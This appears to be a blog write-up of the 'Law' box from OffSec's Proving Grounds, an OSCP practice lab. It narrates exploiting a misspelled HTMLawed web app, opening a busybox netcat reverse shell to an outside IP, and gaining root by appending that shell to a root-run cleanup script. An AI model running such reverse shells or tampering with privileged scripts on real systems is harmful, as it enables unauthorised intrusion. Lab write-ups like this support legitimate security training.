---
layout: writeup
title: Law - Proving Grounds
date: 2024-07-01 13:32:20 +0300
description: A Writeup of the Law Box from Proving Grounds
image: # /assets/images/Law/Law_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, TJ Null]
---

Here is a writeup for the Law lab on [Proving Grounds](https://www.offsec.com/labs/), another box from TJ Null's OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#). Let's kick things off as usual with an nmap scan, using `-v` so we can investigate as we go. We see there is a web server on port 80 and check it out. 

![Law_1.png](/assets/images/Law/Law_1.png){: .responsive-image}

From the project's github, HTMLawed is "a highly customizable PHP script to sanitize / make (X)HTML secure against XSS attacks, so users can edit HTML without risk of your site getting compromised by evildoers." Noted.

We find an exploit-db shell script, but through Google rather than exploit-db or searchsploit because it is actually misspelled with two "L's". 

![Law_4.png](/assets/images/Law/Law_4.png){: .responsive-image}

It seems to work immediately with the busybox shell: `busybox nc 192.168.45.154 80 -e /bin/bash`. Exciting, I feel like I never see that. Maybe the privesc is the tough part. 

![Law_3.png](/assets/images/Law/Law_3.png){: .responsive-image}

This time I `cd ..` my way out of the working directory in case I see a local.txt file, and I do in `/var/www`. Cool. I missed that on the Crane box. 

I can't run `sudo -l` without a password, and I don't see any interesting SUID binaries when I run `find / -type f -perm -u=s 2>/dev/null`, so I download linpeas to check things out and run it. Unfortunately nothing jumps out at me immediately beyond kernel exploits like PwnKit and DirtyPipez. Usually I want to avoid this in a lab environment like this as it is likely the creators had a different path planned, but I'll make a note of them. 

I download and run pspy64 to see if I can find anything interesting there while I think, and I see this: `2024/07/20 17:48:01 CMD: UID=0     PID=14435  | /bin/bash /var/www/cleanup.sh` run a few times. That could be interesting if root is running it, and we can modify. We can tell root is running it because it says the `UID=0`. We could also tell if we ran `lse.sh -l1`, but not linpeas. 

Turns out we can, so we add the busybox shell to the cleanup script and wait. 

![Law_2.png](/assets/images/Law/Law_2.png){: .responsive-image}

![Law_5.png](/assets/images/Law/Law_5.png){: .responsive-image}

A minute later, we catch a root shell, and snag the proof.txt. Nice!

This machine was fairly straightforward once I googled the web service and realized it was misspelled. Then is was just a matter of seeing what processes were running and realize I could abuse one of them. Also - another win for the busybox shell, that's good to know. 